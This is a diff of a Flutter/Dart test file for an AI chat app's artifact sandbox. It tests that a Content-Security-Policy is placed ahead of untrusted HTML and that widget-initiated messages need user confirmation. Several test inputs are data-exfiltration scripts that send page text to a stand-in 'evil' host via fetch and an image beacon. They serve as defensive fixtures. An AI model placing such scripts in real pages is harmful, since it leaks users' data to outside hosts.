@@ -7,10 +7,12 @@ import 'package:every_ai/features/artifacts/export/downloads.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/sandbox.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/svg_view.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/web_view.dart';
+import 'package:every_ai/features/artifacts/ui/visual_view.dart';
 import 'package:every_ai/features/chat/domain/message.dart';
 import 'package:flutter/widgets.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_test/flutter_test.dart';
+import 'package:material_ui/material_ui.dart' as m;
 
 /// The srcdoc attribute of a host page, unescaped.
 String _srcdoc(String page) {
@@ -40,18 +42,31 @@ void main() {
     });
   });
 
-  group('injectIntoHead', () {
-    test('goes first in an existing head', () {
-      expect(
-        injectIntoHead('<html><head lang="x"><title>t</title></head></html>', '<P>'),
-        '<html><head lang="x"><P><title>t</title></head></html>',
-      );
+  group('sandboxedDocument', () {
+    final cspMeta = '<!doctype html><meta http-equiv="Content-Security-Policy"';
+
+    test('the policy comes before any of the content', () {
+      for (final html in [
+        '<html><head lang="x"><title>t</title></head></html>',
+        '<!DOCTYPE html><p>hi</p>',
+        '<button>x</button>',
+        // Markup before the head would otherwise run with no policy.
+        "<script>fetch('https://evil/?d='+document.body.innerText)</script><html><head></head></html>",
+        // A head inside a comment or a string must not move the policy.
+        '<!-- <head> --><script>steal()</script><head></head>',
+        "<script>var s='<head>';new Image().src='https://evil/?'+s</script>",
+      ]) {
+        final doc = sandboxedDocument(html, surface: WebSurface.page, interactive: true);
+        expect(doc, startsWith(cspMeta), reason: html);
+        expect(doc, endsWith(html), reason: html);
+      }
     });
-    test('goes after the doctype when there is no head', () {
-      expect(injectIntoHead('<!DOCTYPE html><p>hi</p>', '<P>'), '<!DOCTYPE html><P><p>hi</p>');
-    });
-    test('fragments get a doctype', () {
-      expect(injectIntoHead('<button>x</button>', '<P>'), '<!doctype html><P><button>x</button>');
+
+    test('the host page carries a policy for the frame to inherit', () {
+      final page = sandboxedHostPage('<p>x</p>', surface: WebSurface.page, interactive: false);
+      final head = page.substring(0, page.indexOf('<iframe'));
+      expect(head, contains('http-equiv="Content-Security-Policy"'));
+      expect(head, contains('default-src'));
     });
   });
 
@@ -106,6 +121,35 @@ void main() {
         );
       }
     });
+  });
+
+  testWidgets('a widget\'s message is sent only after the user confirms it', (tester) async {
+    final sent = <String>[];
+    await tester.pumpWidget(
+      m.MaterialApp(
+        home: EveryThemeScope(
+          theme: EveryTheme.resolve(DesignLanguage.material, Brightness.light),
+          child: Builder(
+            builder: (context) => GestureDetector(
+              onTap: () => sendFromWidget(context, 'Search my chats for bank', sent.add),
+              child: const Text('widget'),
+            ),
+          ),
+        ),
+      ),
+    );
+    await tester.tap(find.text('widget'));
+    await tester.pumpAndSettle();
+    expect(find.textContaining('Search my chats for bank'), findsOneWidget);
+    await tester.tap(find.text('Cancel'));
+    await tester.pumpAndSettle();
+    expect(sent, isEmpty);
+
+    await tester.tap(find.text('widget'));
+    await tester.pumpAndSettle();
+    await tester.tap(find.text('Send'));
+    await tester.pumpAndSettle();
+    expect(sent, ['Search my chats for bank']);
   });
 
   test('handler calls need the host token', () {
